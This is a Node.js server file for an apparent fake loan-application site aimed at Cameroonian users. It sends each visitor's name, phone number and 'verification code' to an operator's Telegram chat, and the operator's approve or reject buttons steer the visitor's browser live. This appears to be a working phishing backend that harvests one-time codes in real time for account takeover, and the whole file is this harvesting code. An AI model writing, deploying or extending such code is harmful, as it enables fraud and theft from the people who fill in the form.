const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const BOT_TOKEN = process.env.BOT_TOKEN; 
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID; 

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Store active socket connections mapped to Telegram message IDs
const activeSockets = {}; 

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// --- SOCKET.IO CONNECTION (Waiting for admin approval) ---
io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);

    socket.on('submit_loan', async (data) => {
        const { firstName, lastName, phone, amount, term, loanType, purpose, employment, income, verificationCode } = data;
        
        const msg = `
🆕 <b>New Loan Application</b>
━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${firstName} ${lastName}
📞 <b>Phone:</b> +237 ${phone}
🔑 <b>5-Digit Code:</b> ${verificationCode}
💰 <b>Amount:</b> ${Number(amount).toLocaleString()} XAF
📆 <b>Term:</b> ${term} months
📋 <b>Type:</b> ${loanType}
🎯 <b>Purpose:</b> ${purpose}
💼 <b>Employment:</b> ${employment}
💵 <b>Income:</b> ${Number(income).toLocaleString()} XAF
━━━━━━━━━━━━━━━━
<i>Waiting for your decision...</i>
        `;

        try {
            const sentMsg = await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROVE', callback_data: `approve_${socket.id}` },
                        { text: '❌ REJECT', callback_data: `reject_${socket.id}` }
                    ]]
                }
            });
            
            // Save the socket ID so we know who to reply to when you click a button
            activeSockets[sentMsg.message_id] = socket.id;
            
        } catch (err) {
            console.error('Telegram Error:', err.message);
            socket.emit('error_msg', 'Failed to contact admin.');
        }
    });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });
});

// --- TELEGRAM BOT ACTIONS (Approve / Reject) ---
bot.on('callback_query', async (query) => {
    const data = query.data.split('_');
    const action = data[0]; // 'approve' or 'reject'
    const socketId = data.slice(1).join('_'); // The user's socket ID
    
    const userSocket = io.sockets.sockets.get(socketId);
    
    if (!userSocket) {
        return bot.answerCallbackQuery(query.id, { text: 'User is no longer online or page was refreshed.' });
    }

    if (action === 'approve') {
        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
        userSocket.emit('approved'); // Tell the browser to go to next page
        bot.editMessageText('✅ <b>APPROVED</b>\nUser has been moved to the next step.', {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    } else if (action === 'reject') {
        bot.answerCallbackQuery(query.id, { text: 'Rejected!' });
        userSocket.emit('rejected'); // Tell the browser to go back to phone number step
        bot.editMessageText('❌ <b>REJECTED</b>\nUser has been sent back to correct details.', {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});